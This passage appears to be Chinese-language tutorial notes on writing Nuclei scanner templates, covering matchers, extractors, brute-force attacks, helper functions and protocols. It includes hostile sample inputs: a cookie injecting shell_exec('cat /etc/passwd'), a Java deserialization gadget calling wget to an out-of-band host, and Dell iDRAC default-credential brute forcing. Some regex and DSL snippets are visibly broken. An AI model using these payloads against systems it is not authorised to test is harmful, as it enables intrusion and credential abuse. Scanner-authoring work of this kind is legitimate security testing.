      - type: status
        status:
          - 200
```
---
#### skip-variables-check
what if my payload contains {{payload here}} and that is not cli env var. Can i escape it or somehow disable nuclei vars detection ?
当你的请求内容里包含 `{{` 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.
```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```
---
### 匹配
```yaml
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "http://crm.bd.itf.nc/ICustomerExportToCrmService"
          - "nc.itf.bd.crm"
        part: body
        condition: and
      - type: word
        words:
          - "text/xml"
        part: header
      - type: status
        status:
          - 200
```
**匹配时间**
```yaml
# 此模板是基于DSL的持续时间匹配器的示例，当响应时间与定义的持续时间（在这种情况下为6或大于6秒）匹配时，返回true。
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
```
**重命名**
```yaml
    matchers:
      - type: word
        encoding: hex
        name: win2000
        words:
          - "0300000b06d00000123400"
      - type: word
        encoding: hex
        name: win2003
        words:
          - "030000130ed000001234000300080002000000"
      - type: word
        encoding: hex
        name: win2008
        words:
          - "030000130ed000001234000200080002000000"
```
**匹配大小**
```yaml
    matchers:
      - type: dsl
        dsl:
          - "len(body))(.*?)()'
```
**提取器案例2**
```yaml
# {"execution_date":"2021-06-05T15:42:39+00:00","message":"Created "}
    extractors:
      - type: regex
        name: exec_date
        part: body
        group: 1
        internal: true
        regex:
          - '"execution_date":"([0-9-A-Z:+]+)"'
# 上面这段将提取出 2021-06-05T15:42:39+00:00
# 详见 CVE-2020-11978 写法
```
**提取器案例3**
```yaml
    extractors:
      - type: regex
        part: body
        regex:
          - '()(.*?)()'
```
**非**
以下是使用否定条件的示例语法，这将返回响应 header 中没有 phpsessID 的所有 URL。
```yaml
    matchers:
      - type: word
        words:
          - "PHPSESSID"
        part: header
        negative: true
```
一个简单的判断蜜罐的示例
```yaml
      - type: word
        words:
          - "荣耀立方"
          - 'var model = "LW-N605R"'
          - 'password'
          - 'success'
          - 'tomcat'
        part: body
        negative: true
        condition: and
```
**Dynamic variabe**
```yaml
  - method: POST
    path:
      - "{{BaseURL}}/login.php"
    body: "username=admin&password=password&Login=Login&user_token={{session}}"
    matchers:
      - type: kval
        name: session
        internal: true
        part: body
        kval:
          - PHPSESSID
```
---
### 爆破
**pitchfork**
```yaml
id: dell-idrac-default-login
info:
  name: Dell iDRAC6/7/8 Default login
  author: kophjager007
  severity: high
  tags: dell,idrac,default-login
requests:
  - method: POST
    path:
      - "{{BaseURL}}/data/login"
    body: "user={{username}}&password={{password}}"
    headers:
      Content-Type: "application/x-www-form-urlencode"
      Referer: "{{BaseURL}}/login.html"
    attack: pitchfork
    payloads:
      username:
        - root
      password:
        - calvin
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '0'
```
---
### 常用匹配
**etc/passwd**
```yaml
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```
**c:/windows/win.ini**
```yaml
      - type: regex
        regex:
          - "bit app support"
```
**windows 回显**
```
cmd.exe /c set /a 12333*32111
396024963
```
**linux 回显**
```
expr 12333 \* 32111
396024963
```
---
### 进阶用法
#### 全局请求头
当目标采用 Basic Auth , 可以直接在调用的命令中加上全局请求头,而不用修改每个模板
```
nuclei -u https://target.com -H "Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=="
```
#### Reusing dynamically extracted values as iterators in http request
- https://github.com/projectdiscovery/nuclei/pull/1288
对 robots.txt 内容进行抓取并运用于下一个请求
```yaml
id: valid-robotstxt-endpoints
info:
  name: Iterate robots.txt and request endpoints
  author: pdteam
  severity: info
requests:
  - raw:
      - |
        GET /robots.txt HTTP/1.1
        Host: {{Hostname}}
      - |
        GET {{endpoint}} HTTP/1.1
        Host: {{Hostname}}
    iterate-all: true
    extractors:
      - part: body
        name: endpoint
        internal: true
        type: regex
        regex:
          - "(?m)/([a-zA-Z0-9-_/\\\\]+)"
    matchers:
      - type: status
        status:
          - 200
```
#### help_functions
```yaml
id: helper-functions-examples
info:
  name: RAW Template with Helper Functions
  author: pdteam
  severity: info
requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        01: {{base64("Hello")}}
        02: {{base64(1234)}}
        03: {{base64_decode("SGVsbG8=")}}
        04: {{base64_py("Hello")}}
        05: {{contains("Hello", "lo")}}
        06: {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
        07: {{gzip("Hello")}}
        08: {{hex_decode("6161")}}
        09: {{hex_encode("aa")}}
        10: {{html_escape("test")}}
        11: {{html_unescape("&lt;body&gt;test&lt;/body&gt;")}}
        12: {{len("Hello")}}
        13: {{len(5555)}}
        14: {{md5("Hello")}}
        15: {{md5(1234)}}
        16: {{mmh3("Hello")}}
        17: {{print_debug(1+2, "Hello")}}
        18: {{rand_base(5, "abc")}}
        19: {{rand_base(5)}}
        20: {{rand_char("abc")}}
        21: {{rand_char()}}
        22: {{rand_int(1, 10)}}
        23: {{rand_int(10)}}
        24: {{rand_int()}}
        25: {{rand_text_alpha(10, "abc")}}
        26: {{rand_text_alpha(10)}}
        27: {{rand_text_alphanumeric(10, "ab12")}}
        28: {{rand_text_alphanumeric(10)}}
        29: {{rand_text_numeric(10, 123)}}
        30: {{rand_text_numeric(10)}}
        31: {{regex("H([a-z]+)o", "Hello")}}
        32: {{remove_bad_chars("abcd", "bc")}}
        33: {{repeat("../", 5)}}
        34: {{replace("Hello", "He", "Ha")}}
        35: {{replace_regex("He123llo", "(\\d+)", "")}}
        36: {{reverse("abc")}}
        37: {{sha1("Hello")}}
        38: {{sha256("Hello")}}
        39: {{to_lower("HELLO")}}
        40: {{to_upper("hello")}}
        41: {{trim("aaaHelloddd", "ad")}}
        42: {{trim_left("aaaHelloddd", "ad")}}
        43: {{trim_prefix("aaHelloaa", "aa")}}
        44: {{trim_right("aaaHelloddd", "ad")}}
        45: {{trim_space("  Hello  ")}}
        46: {{trim_suffix("aaHelloaa", "aa")}}
        47: {{unix_time(10)}}
        48: {{url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")}}
        49: {{url_encode("https://projectdiscovery.io/test?a=1")}}
        50: {{wait_for(1)}}
```
#### 嵌套表达式
```
❌ {{urldecode({{base64_decode('SGVsbG8=')}})}}
✔ {{url_decode(base64_decode('SGVsbG8='))}}
```
在 extractor 中使用
- https://github.com/projectdiscovery/nuclei/discussions/1622
```
{{url_decode(base64_decode('{{SGVsbG8=}}'))}}
```
#### self-contained
A new attribute to HTTP requests that marks all the HTTP Requests in that template as self-sufficient, meaning they do not require any input to be executed.
这个用的比较局限,一般就是用于批量检测 API 可用性的,举个例子,你通过信息泄露获得了一个 API_Key 但你不知道这个是哪个服务的 APIkey,没有特征,那么就只能找哪些官方API接口一个一个试,看哪一个平台可以生效,就是这个意思。
国内环境用的不多,我对这块也没研究过.
- https://blog.projectdiscovery.io/nuclei-v2-5-3-release/
```yaml
id: example-self-contained-input
info:
  name: example-self-contained
  author: pdteam
  severity: info
self-contained: true
requests:
  - raw:
      - |
        GET https://example.com:443/gg HTTP/1.1
        Host: example.com:443
    matchers:
      - type: status
        status:
          - 302
```
#### 文件协议
The default file size of the file template read is 1GB
文件模板默认读取的文件大小 1GB
- https://github.com/projectdiscovery/nuclei/pull/1577
```yaml
file:
  - extensions:
      - all
    extractors:
      - type: regex
        regex:
          - "\"type\": \"service_account\""
```
#### 网络层
```yaml
network:
  - host:
      - '{{Hostname}}'
      - '{{Host}}:22'
    inputs:
      - data: "\n"
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'SSH\-([0-9.-A-Za-z_ ]+)'
      - type: word
        words:
          - Invalid SSH identification string
```
#### 自定义模版变量
自 2.6.9 版本开始支持
```yaml
variables:
  a1: "{{to_lower(rand_base(5))}}"
requests:
  - method: GET
    path:
      - "{{BaseURL}}/?test={{a1}}"
    matchers:
      - type: word
        words:
          - "{{a1}}"
```
---
### 需要验证的问题
* 多个工作流模板之间是否可以进行请求合并
  * 截至 2.5.4 支持了单个工作流模板的请求合并,多个工作流模板的请求合并并不支持
  * https://github.com/projectdiscovery/nuclei/issues/1379
    * 2.8 疑似已解决(并没有😢)
* 对于网络层的探测是否可以通过调用外部库来获得结果
  * issue 里官方有提,但目前没有进一步计划
  * 想要参考 fapro
  * https://github.com/projectdiscovery/network-fingerprint
* 值的管道用法
  * 单模板内可传递,多模板之间不可传递
* BS版本 nuclei/api
  * 目前不支持